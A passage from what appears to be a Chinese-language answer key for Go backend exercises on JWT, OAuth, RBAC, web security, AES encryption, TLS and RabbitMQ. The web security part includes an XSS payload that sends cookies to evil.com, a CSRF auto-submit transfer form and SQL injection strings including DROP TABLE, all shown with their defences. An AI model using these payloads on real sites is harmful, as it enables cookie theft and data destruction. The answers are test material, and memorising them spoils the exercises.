            Issuer:    "myapp",
            IssuedAt:  jwt.NewNumericDate(now),
            ExpiresAt: jwt.NewNumericDate(now.Add(15 * time.Minute)),
        },
    }
    accessToken, err := jwt.NewWithClaims(jwt.SigningMethodHS256, accessClaims).SignedString(jwtSecret)
    if err != nil {
        return "", "", err
    }

    refreshClaims := Claims{
        UserID: userID,
        RegisteredClaims: jwt.RegisteredClaims{
            Issuer:    "myapp",
            IssuedAt:  jwt.NewNumericDate(now),
            ExpiresAt: jwt.NewNumericDate(now.Add(7 * 24 * time.Hour)),
        },
    }
    refreshToken, _ := jwt.NewWithClaims(jwt.SigningMethodHS256, refreshClaims).SignedString(jwtSecret)

    return accessToken, refreshToken, nil
}

func ParseToken(tokenString string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{},
        func(token *jwt.Token) (interface{}, error) {
            return jwtSecret, nil
        })
    if err != nil {
        return nil, err
    }
    claims, ok := token.Claims.(*Claims)
    if !ok || !token.Valid {
        return nil, jwt.ErrSignatureInvalid
    }
    return claims, nil
}

// 测试
func TestJWT(t *testing.T) {
    access, refresh, _ := GenerateToken(1, "alice")
    assert.NotEmpty(t, access)
    assert.NotEmpty(t, refresh)

    claims, err := ParseToken(access)
    assert.NoError(t, err)    // 正常 token
    assert.Equal(t, int64(1), claims.UserID)

    // 过期 token 测试：生成一个已过期的
    expiredClaims := Claims{
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(-1 * time.Hour)),
        },
    }
    expiredToken, _ := jwt.NewWithClaims(jwt.SigningMethodHS256, expiredClaims).SignedString(jwtSecret)
    _, err = ParseToken(expiredToken)
    assert.Error(t, err)    // 过期 token

    // 伪造 token 测试
    fakeToken := "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR"
    _, err = ParseToken(fakeToken)
    assert.Error(t, err)    // 伪造 token
}
```

**改值实验**：
- **把 Access Token 有效期从 15 分钟改成 24 小时**：泄漏后攻击者的窗口期从 15 分钟扩大到 24 小时。配合 Refresh Token 机制，Access Token 应该短。
  为什么要注意？→ JWT 的无状态特性意味着一旦签发就无法撤销（除非加黑名单）。短有效期是唯一的防御。

---

### K-79-2 Refresh Token 刷新

**标准答案**：

```go
func RefreshHandler(c *gin.Context) {
    var req struct {
        RefreshToken string `json:"refresh_token"`
    }
    c.ShouldBindJSON(&req)

    claims, err := ParseToken(req.RefreshToken)
    if err != nil {
        c.JSON(401, gin.H{"error": "invalid refresh token"})
        return
    }

    // 检查 Redis 白名单
    inWhitelist, _ := rdb.Exists(c, "refresh:"+req.RefreshToken).Result()
    if inWhitelist == 0 {
        c.JSON(401, gin.H{"error": "refresh token has been used"})
        return
    }

    // 删除旧 Refresh Token（防重放）
    rdb.Del(c, "refresh:"+req.RefreshToken)

    // 签发新 token
    accessToken, refreshToken, _ := GenerateToken(claims.UserID, claims.Username)

    // 存储新 Refresh Token
    rdb.Set(c, "refresh:"+refreshToken, claims.UserID, 7*24*time.Hour)

    c.JSON(200, gin.H{
        "access_token":  accessToken,
        "refresh_token": refreshToken,
    })
}
```

**解析**：
- Refresh Token 只能使用一次：`redis.Del` 删除旧 token，防止同一个 Refresh Token 被多次使用。
- 为什么需要 Refresh Token 白名单？JWT 本身是无状态的，我们通过 Redis 给它加了"状态"，实现可控失效。

**改值实验**：
- **不删除旧的 Refresh Token**：攻击者截获后可以持续刷新，长期控制账户。一次使用机制是 Refresh Token 安全的基础。
  为什么要注意？→ 防重放是 Refresh Token 的核心安全属性。不防重放的 Refresh Token 等于永不过期。

---

### K-79-3 JWT 无感刷新 ⭐

**标准答案**：

```go
// 中间件：检测即将过期的 token，自动刷新
func JWTRefreshMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        claims := c.MustGet("claims").(*Claims)

        // 如果 Access Token 剩余时间 < 5 分钟
        if time.Until(claims.ExpiresAt.Time) < 5*time.Minute {
            userID := claims.UserID

            // 用 singleflight 防止并发刷新
            v, err, _ := sg.Do("refresh:"+strconv.FormatInt(userID, 10), func() (interface{}, error) {
                newAccess, newRefresh, err := GenerateToken(userID, claims.Username)
                if err != nil {
                    return nil, err
                }
                rdb.Set(c, "refresh:"+newRefresh, userID, 7*24*time.Hour)
                return map[string]string{
                    "access_token":  newAccess,
                    "refresh_token": newRefresh,
                }, nil
            })
            if err == nil {
                tokens := v.(map[string]string)
                c.Header("X-New-Access-Token", tokens["access_token"])
                c.Header("X-New-Refresh-Token", tokens["refresh_token"])
            }
        }
        c.Next()
    }
}
```

**前后端协作流程**：
```
1. 客户端发请求 → 携带 Access Token
2. 服务端检测 Access Token 即将过期（< 5min）
3. 服务端自动签发新 token，通过响应头 X-New-Access-Token 返回
4. 客户端拦截器检测到响应头 → 替换本地存储的 token
5. 客户端下次请求用新 token
```

**换个角度想**：无感刷新的本质是把 token 刷新从「用户操作」变成「服务端自动」。中间件的 singleflight 确保 100 个并发请求只触发一次刷新（否则会签发 100 对 token，造成 Refresh Token 泄漏风险）。

---

## 第80章 · OAuth 2.0

### K-80-1 OAuth 流程描述

**标准答案**：

**四个角色**：
1. **Resource Owner（用户）**：拥有数据的最终用户
2. **Client（第三方应用）**：想访问用户数据的应用
3. **Authorization Server（授权服务器）**：GitHub/Google 等
4. **Resource Server（资源服务器）**：存储用户数据的服务器

**授权码流程（ASCII 时序图）**：
```
用户 → 第三方应用：  "用 GitHub 登录"
第三方应用 → 用户浏览器：  重定向到 GitHub 授权页
                            ?client_id=xxx&redirect_uri=yyy&scope=user
用户 → GitHub：     确认授权（输入账号密码）
GitHub → 用户浏览器：  重定向回第三方应用
                            ?code=AUTHORIZATION_CODE
第三方应用 → GitHub： POST /token {code, client_id, client_secret}
GitHub → 第三方应用：  {access_token: "gho_xxx", ...}
第三方应用 → GitHub： GET /user (Authorization: Bearer gho_xxx)
GitHub → 第三方应用：  {login: "alice", email: "alice@example.com"}
```

**为什么需要授权码这一步？**
- **安全原因**：Access Token 不经过浏览器（浏览器的 URL 可能被浏览器历史、日志、Referer 头泄漏）。授权码通过前端重定向传递（暴露在 URL 中无所谓——它是一次性的，且需要 client_secret 才能兑换）。
- **认证原因**：code 换 token 时，需要提供 `client_secret`，这步是服务端到服务端的通信，不经过用户浏览器。这样攻击者即使截获了 code，没有 client_secret 也无法换 token。

**换个角度想**：OAuth 2.0 有四种授权模式：授权码（最安全，有后端）、隐式（已废弃，SPA 场景）、密码（废弃，信任客户端）、客户端凭证（机器对机器）。新项目只用授权码 + PKCE。

---

### K-80-2 OAuth 三方登录集成 ⭐

**标准答案**：

```go
var oauthConfig = &oauth2.Config{
    ClientID:     "your_github_client_id",
    ClientSecret: "your_github_client_secret",
    RedirectURL:  "http://localhost:8080/api/v1/auth/github/callback",
    Scopes:       []string{"user:email"},
    Endpoint:     github.Endpoint,
}

func GithubLoginHandler(c *gin.Context) {
    url := oauthConfig.AuthCodeURL("random-state", oauth2.AccessTypeOnline)
    c.Redirect(http.StatusFound, url)
}

func GithubCallbackHandler(c *gin.Context) {
    code := c.Query("code")
    state := c.Query("state")
    if state != "random-state" {
        c.JSON(400, gin.H{"error": "invalid state"})
        return
    }

    // 用 code 换 access_token
    token, err := oauthConfig.Exchange(c, code)
    if err != nil {
        c.JSON(500, gin.H{"error": "token exchange failed"})
        return
    }

    // 用 access_token 获取 GitHub 用户信息
    client := oauthConfig.Client(c, token)
    resp, _ := client.Get("https://api.github.com/user")
    defer resp.Body.Close()

    var githubUser struct {
        ID    int64  `json:"id"`
        Login string `json:"login"`
        Email string `json:"email"`
    }
    json.NewDecoder(resp.Body).Decode(&githubUser)

    // 本地创建/绑定用户
    user := findOrCreateUser(githubUser.ID, githubUser.Login, githubUser.Email)

    // 签发 JWT
    accessToken, refreshToken, _ := GenerateToken(user.ID, user.Username)
    c.JSON(200, gin.H{
        "access_token":  accessToken,
        "refresh_token": refreshToken,
    })
}
```

**换个角度想**：OAuth 登录看起来复杂，但核心只有三步：获取授权码 → 换 Access Token → 拿用户信息。使用 `golang.org/x/oauth2` 库可以让 token exchange 变得很简单。

---

## 第81章 · RBAC

### K-81-1 设计角色权限表

**标准答案**：

```sql
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL UNIQUE,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE roles (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50) NOT NULL UNIQUE,
    description VARCHAR(200)
);

CREATE TABLE permissions (
    id INT PRIMARY KEY AUTO_INCREMENT,
    code VARCHAR(50) NOT NULL UNIQUE,
    name VARCHAR(100) NOT NULL
);

CREATE TABLE user_roles (
    user_id INT NOT NULL,
    role_id INT NOT NULL,
    PRIMARY KEY (user_id, role_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE CASCADE
);

CREATE TABLE role_permissions (
    role_id INT NOT NULL,
    permission_id INT NOT NULL,
    PRIMARY KEY (role_id, permission_id),
    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE CASCADE,
    FOREIGN KEY (permission_id) REFERENCES permissions(id) ON DELETE CASCADE
);

-- 预置角色
INSERT INTO roles (name, description) VALUES
('admin', '管理员'), ('editor', '编辑'), ('viewer', '访客');

-- 预置权限
INSERT INTO permissions (code, name) VALUES
('user:read', '查看用户'), ('user:write', '编辑用户'),
('article:read', '查看文章'), ('article:write', '编辑文章'),
('article:delete', '删除文章');

-- 管理员：全部权限
INSERT INTO role_permissions (role_id, permission_id)
SELECT (SELECT id FROM roles WHERE name='admin'), id FROM permissions;

-- 编辑：文章增删改查 + 用户查看
INSERT INTO role_permissions (role_id, permission_id)
SELECT (SELECT id FROM roles WHERE name='editor'), id FROM permissions WHERE code IN ('user:read','article:read','article:write','article:delete');

-- 访客：文章查看 + 用户查看
INSERT INTO role_permissions (role_id, permission_id)
SELECT (SELECT id FROM roles WHERE name='viewer'), id FROM permissions WHERE code IN ('user:read','article:read');
```

**换个角度想**：五表设计（users, roles, permissions, user_roles, role_permissions）是标准 RBAC。如果需求变成「某篇文章只允许创建者编辑」，这就超出了 RBAC 的能力，需要引入 ACL 或 ABAC。

---

### K-81-2 权限中间件实现

**标准答案**：

```go
func RequirePermission(perm string) gin.HandlerFunc {
    return func(c *gin.Context) {
        user := c.MustGet("user").(*User)

        // 1. 先查 Redis 缓存
        cacheKey := fmt.Sprintf("perm:%d:%s", user.ID, perm)
        cached, err := rdb.Get(c, cacheKey).Result()
        if err == nil && cached == "1" {
            c.Next()
            return
        }

        // 2. 查库
        var count int64
        db.Raw(`
            SELECT COUNT(*) FROM user_roles ur
            JOIN role_permissions rp ON ur.role_id = rp.role_id
            JOIN permissions p ON p.id = rp.permission_id
            WHERE ur.user_id = ? AND p.code = ?
        `, user.ID, perm).Scan(&count)

        if count > 0 {
            rdb.Set(c, cacheKey, "1", 5*time.Minute)
            c.Next()
            return
        }

        c.AbortWithStatusJSON(403, gin.H{"code": 10004, "message": "forbidden"})
    }
}

// 使用
r.GET("/api/v1/users", AuthMiddleware(), RequirePermission("user:read"), listUsers)
```

**改值实验**：
- **把 Redis 缓存 TTL 从 5m 改成 5s**：每 5 秒就需要查一次数据库，DB 压力增大，但从另一个角度说权限变更能更快生效。
  为什么要注意？→ 缓存 TTL = 权限变更延迟。管理员改了权限，用户最多等 TTL 时间才能生效。平衡点在安全需求和性能之间。

---

### K-81-3 权限缓存刷新 ⭐

**标准答案**：

**方案：版本号 + 中间件检查**

```go
// 每个用户一个权限版本号
// 管理员修改角色时，递增该用户的版本号
func UpdateUserRoles(userID int64, roleIDs []int) error {
    tx, _ := db.Begin()
    tx.Exec("DELETE FROM user_roles WHERE user_id = ?", userID)
    for _, rid := range roleIDs {
        tx.Exec("INSERT INTO user_roles (user_id, role_id) VALUES (?, ?)", userID, rid)
    }
    // 递增版本号（使缓存失效）
    tx.Exec("UPDATE users SET perm_version = perm_version + 1 WHERE id = ?", userID)
    return tx.Commit()
}

// 中间件中检查版本号
func RequirePermission(perm string) gin.HandlerFunc {
    return func(c *gin.Context) {
        user := c.MustGet("user").(*User)
        cacheKey := fmt.Sprintf("perm:%d:%s", user.ID, perm)
        versionKey := fmt.Sprintf("perm_version:%d", user.ID)

        cached, _ := rdb.Get(c, cacheKey).Result()
        cachedVersion, _ := rdb.Get(c, versionKey).Result()

        currentVersion := strconv.Itoa(user.PermVersion)
        if cached == "1" && cachedVersion == currentVersion {
            c.Next()
            return
        }

        // 缓存失效或版本不匹配，重新查库
        // ... 查库逻辑 ...
        rdb.Set(c, cacheKey, "1", 5*time.Minute)
        rdb.Set(c, versionKey, currentVersion, 5*time.Minute)
    }
}
```

**换个角度想**：缓存失效有三种经典模式：① 主动删除（管理员操作后删缓存）② 版本号（改一次就全失效）③ 消息通知（Pub/Sub 通知所有实例删缓存）。版本号最简单可靠，消息通知延迟最低。

---

## 第82章 · Web 安全

### K-82-1 SQL 注入攻击模拟与防护

**标准答案**：

**1. 恶意输入绕过登录**：
```sql
-- 输入 username: admin' --
-- 输入 password: anything

-- 拼接后的 SQL：
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
-- -- 后面的被当作注释，密码验证被绕过！
```

**2. 参数化查询修复**：
```go
// ✅ 参数化查询
query := "SELECT * FROM users WHERE username = ? AND password = ?"
db.QueryRow(query, username, hashedPassword)
```

**3. GORM 安全写法**：
```go
// ✅ GORM 自动参数化
db.Where("username = ?", username).First(&user)
db.Where("username = ? AND password = ?", username, password)

// GORM 防注入原理：使用占位符 ?，数据库驱动自动转义参数值
```

**改值实验**：
- **把 `?` 占位符改成 `fmt.Sprintf` 拼接**：即使用了 ORM，错误地将用户输入拼接到 SQL 字符串仍有注入风险。
  为什么要注意？→ ORM 不是银弹。`db.Raw(fmt.Sprintf("...WHERE name='%s'", input))` 照样能注入。

---

### K-82-2 XSS 攻击模拟与防护

**标准答案**：

**1. XSS Payload**：
```html
<!-- 发表评论时输入 -->
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

<!-- 或 -->
<img src=x onerror="alert(document.cookie)">
```

**2. HTML 转义函数**：
```go
import "html/template"

func EscapeHTML(s string) string {
    return template.HTMLEscapeString(s)
    // < 变成 &lt;   > 变成 &gt;   " 变成 &quot;
}

// 在 Gin 模板中使用
c.HTML(200, "article.html", gin.H{
    "content": template.HTML(EscapeHTML(article.Content)),
})
```

**3. Content-Security-Policy**：
```go
func CSPMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        c.Header("Content-Security-Policy",
            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'")
        c.Next()
    }
}
```

**换个角度想**：XSS 防御的三层：① 输入过滤（永远不可靠）② 输出转义（核心防线）③ CSP（最后兜底）。攻击者只要绕过一层就能攻击，防御者三层都要守住。

---

### K-82-3 CSRF 攻击模拟与防护

**标准答案**：

**1. CSRF 攻击流程**：
```
1. 用户登录了 bank.com（Cookie 中存有 session）
2. 用户访问了恶意网站 evil.com
3. evil.com 中有隐藏表单：
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. 浏览器自动携带 bank.com 的 Cookie 发送请求
5. 转账成功！用户完全不知情
```

**2. CSRF Token 防护**：
```go
func CSRFTokenMiddleware() gin.HandlerFunc {
    return func(c *gin.Context) {
        if c.Request.Method == "GET" {
            token := generateCSRFToken()
            c.SetCookie("csrf_token", token, 3600, "/", "", false, false)
            c.Next()
            return
        }

        // POST/PUT/DELETE 验证
        cookieToken, _ := c.Cookie("csrf_token")
        headerToken := c.GetHeader("X-CSRF-Token")
        if cookieToken == "" || headerToken == "" || cookieToken != headerToken {
            c.AbortWithStatusJSON(403, gin.H{"error": "csrf token invalid"})
            return
        }
        c.Next()
    }
}
```

前端需要从 Cookie 读取 token 并放入请求头 `X-CSRF-Token`。

**3. SameSite Cookie**：
```go
c.SetSameSite(http.SameSiteLaxMode)  // Gin 默认
// SameSite=Lax: 跨站 GET 不发送 Cookie（除导航外）
// SameSite=Strict: 任何跨站请求都不发送 Cookie
// SameSite=None: 所有请求都发送（必须配合 Secure）
```

**换个角度想**：CSRF 的本质是利用浏览器自动携带 Cookie 的特性。防御手段：① CSRF Token（攻击者无法读取你的 Cookie 中的 token）② SameSite=Lax（浏览器层面禁止跨站携带 Cookie）③ 验证 Origin/Referer 头。

---

### K-82-4 综合安全扫描 ⭐

**标准答案**：

```go
package scanner

import (
    "fmt"
    "net/http"
    "strings"
)

type SecurityScanner struct {
    BaseURL   string
    AuthToken string
}

func (s *SecurityScanner) ScanSQLInjection() {
    payloads := []string{
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL --",
        "admin' --",
    }

    for _, payload := range payloads {
        resp, _ := http.Get(fmt.Sprintf("%s/api/v1/users?name=%s", s.BaseURL, payload))
        body := readBody(resp)
        // 检查响应是否包含敏感信息（如全量用户数据）
        if strings.Contains(body, "password") || strings.Contains(body, "DROP") {
            fmt.Printf("⚠  SQLi: %s may be vulnerable with %s\n", s.BaseURL, payload)
        }
    }
}

func (s *SecurityScanner) ScanUnauthorizedAccess() {
    endpoints := []string{"/api/v1/users", "/api/v1/admin", "/api/v1/orders"}
    for _, ep := range endpoints {
        req, _ := http.NewRequest("GET", s.BaseURL+ep, nil)
        // 不带 token
        resp, _ := http.DefaultClient.Do(req)
        if resp.StatusCode != 401 && resp.StatusCode != 403 {
            fmt.Printf("⚠  Unauthorized: %s returned %d (no auth)\n", ep, resp.StatusCode)
        }
    }
}

func (s *SecurityScanner) ScanSensitiveInfo() {
    payloads := []string{
        "' OR 1=1 --",
        "invalid%%zz",
        `{"x": 1/0}`,
    }
    sensitivePatterns := []string{
        "stack trace", "panic:", "goroutine", "mysql_", "SQLSTATE",
        "at line", "exception", "Error 1064",
    }

    for _, payload := range payloads {
        resp, _ := http.Get(fmt.Sprintf("%s/api/v1/search?q=%s", s.BaseURL, payload))
        body := readBody(resp)
        for _, pattern := range sensitivePatterns {
            if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
                fmt.Printf("⚠  InfoLeak: %s with payload=%s leaked '%s'\n",
                    s.BaseURL, payload, pattern)
            }
        }
    }
}
```

**换个角度想**：这个扫描脚本只是基础版。真正的安全扫描需要用 OWASP ZAP、Burp Suite 等专业工具。但理解扫描原理能帮助你写出更安全的代码——知道攻击者会怎么尝试，你就能提前防范。

---

## 第83章 · 加密

### K-83-1 AES 加解密实现

**标准答案**：

```go
package crypto

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "errors"
    "io"
)

func Encrypt(plaintext []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key) // key 必须是 32 字节（AES-256）
    if err != nil {
        return nil, err
    }

    aesGCM, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonce := make([]byte, aesGCM.NonceSize()) // 12 字节
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        return nil, err
    }

    // nonce 拼接在密文前
    ciphertext := aesGCM.Seal(nonce, nonce, plaintext, nil)
    return ciphertext, nil
}

func Decrypt(ciphertext []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    aesGCM, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonceSize := aesGCM.NonceSize()
    if len(ciphertext) < nonceSize {
        return nil, errors.New("ciphertext too short")
    }

    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    return aesGCM.Open(nil, nonce, ciphertext, nil)
}

// 测试
func TestAES(t *testing.T) {
    key := make([]byte, 32)
    rand.Read(key)

    plaintext := []byte("hello world")
    ct1, _ := Encrypt(plaintext, key)
    ct2, _ := Encrypt(plaintext, key)
    assert.NotEqual(t, ct1, ct2) // 不同 nonce 产生不同密文

    dec1, _ := Decrypt(ct1, key)
    dec2, _ := Decrypt(ct2, key)
    assert.Equal(t, plaintext, dec1)
    assert.Equal(t, plaintext, dec2)
}
```

**密钥管理建议**：
- 开发环境：环境变量（不提交 Git）
- 生产环境：KMS（AWS KMS / 阿里云 KMS）、Vault、或 Kubernetes Secrets
- **绝对不要**写在代码里或提交到 Git

**改值实验**：
- **把 AES-GCM 改成 AES-CBC**：CBC 模式下，相同明文 + 相同密钥 + 相同 IV 产生相同密文。而 GCM 自带认证（防篡改），如果有人修改了 CBC 密文，解密不会报错只会产生乱码，GCM 会直接拒绝。
  为什么要注意？→ GCM 是 AEAD 模式（认证加密），同时提供机密性和完整性。CBC 只提供机密性容易被 padding oracle 攻击。

---

### K-83-2 敏感字段加密 ⭐

**标准答案**：

```go
type EncryptedString string

var encKey = initKey() // 从 KMS/环境变量加载

func (es *EncryptedString) Scan(value interface{}) error {
    if value == nil {
        return nil
    }
    encrypted, ok := value.([]byte)
    if !ok {
        return errors.New("type assertion to []byte failed")
    }
    // 解密
    version := encrypted[0] // 第一个字节存储密钥版本
    ciphertext := encrypted[1:]
    key := getKeyByVersion(version)
    plaintext, err := Decrypt(ciphertext, key)
    if err != nil {
        return err
    }
    *es = EncryptedString(plaintext)
    return nil
}

func (es EncryptedString) Value() (driver.Value, error) {
    // 加密
    version := byte(1) // 当前密钥版本
    key := getKeyByVersion(version)
    ciphertext, err := Encrypt([]byte(es), key)
    if err != nil {
        return nil, err
    }
    // 版本号 + 密文
    result := append([]byte{version}, ciphertext...)
    return result, nil
}

type User struct {
    ID       int64            `gorm:"primaryKey"`
    Phone    EncryptedString  `gorm:"type:varbinary(256)"`
    IDCard   EncryptedString  `gorm:"type:varbinary(512)"`
}

// 密钥轮换
func getKeyByVersion(version byte) []byte {
    // 从 KMS 获取对应版本的密钥
    // 旧版密钥不解密：旧数据用 v1 解密，新数据用 v2 加密
    if version == 1 {
        return keys["v1"]
    }
    return keys["v2"]
}
```

**换个角度想**：`Scan`/`Value` 接口是 `database/sql` 的标准接口，实现后 GORM/sqlx 等 ORM 在写入/读取数据库时会自动调用，对业务层完全透明。这就是"透明加密"——业务代码完全不用关心加密细节。

---

## 第84章 · HTTPS/TLS

### K-84-1 TLS 握手描述

**标准答案**：

**TLS 1.3 握手流程**（1-RTT）：

```
Client                                    Server
|                                            |
|  --- Client Hello --->                     |
|  (支持的密码套件、DH 公钥共享)              |
|                                            |
|                     <--- Server Hello ---  |
|                     (选择的密码套件、证书)    |
|                     <--- 证书验证 ---       |
|                     <--- 完成消息 ---       |
|                                            |
|  --- 完成消息 --->                         |
|  (对称密钥已协商完成)                       |
|                                            |
|  <===== 加密通信开始 =====>                |
```

**关键回答**：
1. **Client Hello**：支持的 TLS 版本、密码套件列表、客户端随机数、DH 密钥共享（ECDHE 公钥）
2. **Server Hello**：选择的 TLS 版本和密码套件、服务器证书、DH 密钥共享、服务器随机数
3. **对称密钥协商**：客户端和服务器各自用 DH 私钥和对方公钥计算共享密钥，加上双方的随机数，通过 HKDF 派生对称密钥。无需传输对称密钥本身。
4. **TLS 1.3 比 1.2 快在哪**：1.3 = 1-RTT（Client Hello 时就发 DH 参数）；1.2 = 2-RTT（第一轮协商加密方式，第二轮交换 DH 参数）。1.3 减少了 1 次 RTT。

**换个角度想**：TLS 1.3 之所以快，是因为它将密钥协商和密码套件协商合并到一轮完成。此外 1.3 去掉了不安全的算法（RSA 密钥交换、CBC 模式、SHA1），使整个握手更安全高效。

---

### K-84-2 自签名证书配置 ⭐

**标准答案**：

**1. 生成自签名证书**：
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
```

**2. Gin 启用 HTTPS**：
```go
func main() {
    r := gin.Default()

    // 同时启动 HTTP（80）跳转 HTTPS（443）
    go func() {
        redirectRouter := gin.Default()
        redirectRouter.GET("/*path", func(c *gin.Context) {
            c.Redirect(301, "https://"+c.Request.Host+c.Request.URL.String())
        })
        redirectRouter.Run(":80")
    }()

    r.GET("/ping", func(c *gin.Context) {
        c.JSON(200, gin.H{"message": "pong"})
    })

    r.RunTLS(":443", "cert.pem", "key.pem")
}
```

**3. 生产环境推荐**：
- 使用 Let's Encrypt（免费 CA）+ `autocert` 自动续签
- Nginx 反向代理做 TLS termination，Go 应用本身不处理 TLS

**换个角度想**：自签名证书仅用于测试。浏览器会显示「不安全」警告，用户需要点"高级→继续访问"。生产环境必须用 CA 签发的证书。

---

## 第85章 · 消息队列基础

### K-85-1 MQ 场景选择题

**标准答案**：

| 场景 | 是否适合 | 理由 |
|------|---------|------|
| A) 注册后发欢迎邮件 | ✅ 适合 | 异步任务，不要求实时反馈，失败可重试 |
| B) 查询订单详情 | ❌ 不适合 | 需要实时返回结果，MQ 是异步的，用户等不了 |
| C) 秒杀下单削峰 | ✅ 适合 | 经典场景，MQ 缓冲瞬时流量，后端平滑消费 |
| D) 每日生成报表 | ✅ 适合 | 定时任务，耗时较长，异步执行不影响用户 |
| E) 同步 RPC 调用 | ❌ 不适合 | 同步调用需要即时响应，MQ 是异步的 |

**换个角度想**：判断标准：是否需要立即返回结果？是 → 不适合 MQ；否 → 适合 MQ。MQ 的核心能力是解耦、削峰、异步，对同步场景无能为力。

---

### K-85-2 MQ 选型对比

**标准答案**：

| 维度 | RabbitMQ | Kafka |
|------|----------|-------|
| 消息可靠性 | 高（ACK 确认 + 持久化，基本不丢消息） | 高（副本机制 + ISR，配置得当可不丢） |
| 吞吐量 | 中等（万条/秒） | 极高（百万条/秒） |
| 消息顺序保证 | 单队列内严格有序 | 单 Partition 内有序 |
| 消息回溯能力 | 弱（消费后删除） | 强（按时间/offset 回溯） |
| 适用场景 | 业务异步解耦、任务队列、RPC 调用 | 日志采集、流处理、事件溯源、大数据管道 |

**换个角度想**：RabbitMQ 是「消息代理」——专注于灵活路由和可靠投递；Kafka 是「分布式日志」——专注于高吞吐和持久化。选型不是"哪个更好"，而是"哪个更匹配你的场景"。

---

## 第86章 · RabbitMQ 基础

### K-86-1 Hello World 模式

**标准答案**：

```go
// 生产者
func Produce() {
    conn, _ := amqp.Dial("amqp://guest:guest@localhost:5672/")
    defer conn.Close()
    ch, _ := conn.Channel()
    defer ch.Close()

    q, _ := ch.QueueDeclare("hello", false, false, false, false, nil)

    ch.PublishWithContext(ctx, "", q.Name, false, false,
        amqp.Publishing{ContentType: "text/plain", Body: []byte("Hello World!")})
}

// 消费者
func Consume() {
    conn, _ := amqp.Dial("amqp://guest:guest@localhost:5672/")
    defer conn.Close()
    ch, _ := conn.Channel()
    defer ch.Close()

    q, _ := ch.QueueDeclare("hello", false, false, false, false, nil)

    msgs, _ := ch.Consume(q.Name, "", true, false, false, false, nil)

    go func() {
        for d := range msgs {
            fmt.Printf("Received: %s\n", d.Body)
        }
    }()
    select {} // 阻塞
}
```

**解析**：
- `QueueDeclare`：声明队列，确保队列存在（幂等操作）。
- 默认交换机（`""`）：直接路由到指定队列。
- `autoAck=true`：自动确认，适合不重要的消息。

**改值实验**：
- **把 `autoAck` 从 `true` 改成 `false` 但忘记手动 Ack**：消息被消费但未确认，RabbitMQ 认为消费者崩溃，消息重新入队 → 被重复消费。
  为什么要注意？→ 手动 Ack 模式必须显式调用 `d.Ack(false)`，否则消息不会被移除且会被重复投递。

---

### K-86-2 Work Queue 模式

**标准答案**：

```go
func Consume() {
    conn, _ := amqp.Dial("amqp://guest:guest@localhost:5672/")
    defer conn.Close()
    ch, _ := conn.Channel()
    defer ch.Close()

    q, _ := ch.QueueDeclare("task_queue", true, false, false, false, nil)

    // 公平调度：每次只取一条
    ch.Qos(1, 0, false)

    msgs, _ := ch.Consume(q.Name, "", false, false, false, false, nil) // autoAck=false

    for d := range msgs {
        fmt.Printf("Processing: %s\n", d.Body)
        time.Sleep(2 * time.Second) // 模拟耗时任务
        d.Ack(false) // 手动确认
    }
}

// 生产者发送持久化消息
func Produce() {
    // ...
    ch.PublishWithContext(ctx, "", q.Name, false, false,
        amqp.Publishing{
            DeliveryMode: amqp.Persistent, // 消息持久化
            ContentType:  "text/plain",
            Body:         []byte(msg),
        })
}
```

**关键配置**：
- `QueueDeclare(..., durable=true, ...)`：队列持久化
- `DeliveryMode: amqp.Persistent`：消息持久化（写入磁盘）
- `ch.Qos(1, 0, false)`：prefetch=1，每次只预取 1 条消息（公平调度）
- `autoAck=false` + `d.Ack(false)`：手动确认

**改值实验**：
- **把 `Qos(1, ...)` 去掉或改成 `Qos(0, ...)`**：RabbitMQ 将所有消息一次性推给消费者。如果消费者 A 处理快、B 处理慢，A 会空闲而 B 积压大量消息。prefetch=1 保证轮询分发。

---

## 第87章 · RabbitMQ 进阶

### K-87-1 Publish/Subscribe 模式

**标准答案**：

```go
// 生产者（发到 fanout 交换机）
func Produce() {
    ch, _ := conn.Channel()
    ch.ExchangeDeclare("logs", "fanout", true, false, false, false, nil)
    ch.PublishWithContext(ctx, "logs", "", false, false, amqp.Publishing{
        ContentType: "text/plain",
        Body:        []byte("log message"),
    })
}

// 消费者（各自绑定临时队列）
func Consume(name string) {
    ch, _ := conn.Channel()
    ch.ExchangeDeclare("logs", "fanout", true, false, false, false, nil)
    q, _ := ch.QueueDeclare("", false, false, true, false, nil) // 临时队列
    ch.QueueBind(q.Name, "", "logs", false, nil)
    // ... 消费
}
```

**解析**：
- `"fanout"`：广播模式，所有绑定队列都收到消息副本。
- 临时队列（`exclusive=true`）：消费者断开后自动删除，不同消费者有不同队列名。
- 注意：如果一台消费者离线，它没收到消息就是丢了——这是 Pub/Sub 的天然特性（不保证送达离线消费者）。

